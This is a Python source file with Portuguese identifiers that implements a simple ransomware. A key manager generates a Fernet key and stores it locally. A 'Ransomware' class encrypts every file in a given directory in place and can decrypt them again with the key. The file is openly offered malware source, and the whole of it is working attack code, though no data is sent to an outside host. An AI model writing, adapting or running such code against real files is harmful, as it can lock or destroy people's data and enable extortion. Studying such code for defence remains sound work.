import os

from cryptography.fernet import Fernet

from arquivos_utils import escrever_arquivo, ler_arquivo
from excecoes import ChaveNaoEncontrada, ChaveInvalida


class GerenciadorDeChave:
    def __init__(self, caminho_para_chave):
        self.caminho_para_chave = caminho_para_chave

    def crie_chave(self):
        try:
            return self.obtenha_chave()
        except ChaveNaoEncontrada:
            chave_criptografia = Fernet.generate_key()
            escrever_arquivo(self.caminho_para_chave, chave_criptografia)
            return chave_criptografia

    def obtenha_chave(self, legivel=False):
        if self.chave_existe():
            chave = ler_arquivo(self.caminho_para_chave)
            return chave.decode('utf-8') if legivel else chave

        raise ChaveNaoEncontrada(
            f'Chave não encontrada em {self.caminho_para_chave}. '
            'Os arquivos não foram criptografados ou a chave foi removida manualmente.')

    def remova_chave(self):
        if self.chave_existe():
            os.remove(self.caminho_para_chave)

    def chave_existe(self):
        return os.path.exists(self.caminho_para_chave)

    @staticmethod
    def converta_para_bytes(chave):
        return chave.encode('utf-8')


class Ransomware:
    def __init__(self, gerenciador_de_chave):
        self.gerenciador_de_chave = gerenciador_de_chave

    def infecte_arquivo(self, caminho_para_arquivo):
        conteudo = ler_arquivo(caminho_para_arquivo)
        conteudo_criptografado = Fernet(self.gerenciador_de_chave.crie_chave()).encrypt(conteudo)
        escrever_arquivo(caminho_para_arquivo, conteudo_criptografado)

    def infecte_diretorio(self, diretorio):
        for nome_arquivo in os.listdir(diretorio):
            caminho_arquivo = f'{diretorio}/{nome_arquivo}'
            self.infecte_arquivo(caminho_arquivo)

    def desinfecte_arquivo(self, caminho_para_arquivo, chave_legivel, remover_chave=False):
        conteudo_criptografado = ler_arquivo(caminho_para_arquivo)
        chave = self.gerenciador_de_chave.converta_para_bytes(chave_legivel)

        try:
            conteudo = Fernet(chave).decrypt(conteudo_criptografado)
        except ValueError:
            raise ChaveInvalida(f'A chave {chave_legivel} é inválida!')

        escrever_arquivo(caminho_para_arquivo, conteudo)

        if remover_chave:
            self.gerenciador_de_chave.remova_chave()

    def desinfecte_diretorio(self, diretorio, chave, remover_chave=False):
        for nome_arquivo in os.listdir(diretorio):
            caminho_arquivo = f'{diretorio}/{nome_arquivo}'
            self.desinfecte_arquivo(caminho_arquivo, chave)

        if remover_chave:
            self.gerenciador_de_chave.remova_chave()
